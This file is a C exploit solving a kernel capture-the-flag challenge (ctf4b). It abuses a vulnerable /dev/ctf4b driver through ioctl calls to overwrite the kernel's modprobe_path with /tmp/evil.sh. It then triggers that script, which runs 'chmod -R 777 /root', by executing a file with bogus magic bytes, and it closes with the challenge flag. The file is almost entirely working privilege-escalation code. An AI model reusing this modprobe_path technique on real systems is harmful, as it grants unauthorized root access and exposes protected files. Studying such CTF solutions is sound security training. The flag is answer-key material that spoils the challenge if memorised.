#include "./src/ctf4b.h"
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

static unsigned long modprobe_path = 0xffffffff81e3a080;

int main() {
    int fd;
    char cmd[] = "/tmp/evil.sh";

    fd = open("/dev/ctf4b", O_RDWR);
    if(fd == -1) {
        close(fd);
        perror("open");
    }

    ioctl(fd, CTF4B_IOCTL_STORE, cmd);
    ioctl(fd, CTF4B_IOCTL_LOAD, modprobe_path);

    system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/evil.sh");
    system("chmod +x /tmp/evil.sh");
    system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
    system("chmod +x /tmp/pwn");
    system("/tmp/pwn");

    return 0;
}
// ctf4b{HOMEWORK:Write_a_stable_exploit_with_KASLR_enabled}
